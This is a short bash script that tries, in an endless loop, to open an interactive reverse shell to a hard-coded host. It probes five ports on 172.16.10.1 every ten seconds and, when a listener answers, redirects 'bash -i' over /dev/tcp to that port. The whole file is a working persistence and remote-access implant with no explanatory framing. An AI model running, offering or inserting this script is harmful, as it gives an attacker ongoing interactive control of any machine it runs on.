#!/bin/bash
TARGET="172.16.10.1"
PORTS=("34455" "34456" "34457" "34458" "34459")

listener_is_reachable() {
  local port="${1}"
  if timeout 0.5 bash -c "</dev/tcp/${TARGET}/${port}" 2> /dev/null; then
    return 0
  else
    return 1 
  fi
}

connect_reverse_shell() {
  local port="${1}"
  bash -i >& "/dev/tcp/${TARGET}/${port}" 0>&1
}

while true; do
  for port in "${PORTS[@]}"; do
    if listener_is_reachable "${port}"; then
      echo "Port ${port} is reachable, attempting a connection..."
      connect_reverse_shell "${port}"
    else
      echo "Port ${port} is not reachable."
    fi
  done
  
  echo "Sleeping for 10 seconds before the next attempt..."
  sleep 10
done